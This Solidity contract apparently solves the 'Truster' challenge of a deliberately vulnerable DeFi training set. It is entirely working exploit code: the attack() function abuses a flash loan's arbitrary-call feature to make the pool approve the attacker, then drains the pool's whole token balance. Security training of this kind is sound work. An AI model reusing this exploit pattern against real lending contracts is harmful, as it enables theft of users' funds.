// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./TrusterLenderPool.sol";

contract LenderAttacker {
    IERC20 public immutable damnValuableToken;
    TrusterLenderPool public immutable pool;

    constructor(address _tokenAddress, address _pool) {
        damnValuableToken = IERC20(_tokenAddress);
        pool = TrusterLenderPool(_pool);
    }

    function attack() public {
        uint256 poolBalance = damnValuableToken.balanceOf(address(pool));
        bytes memory approveCall = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );

        pool.flashLoan(0, msg.sender, address(damnValuableToken), approveCall);
        damnValuableToken.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
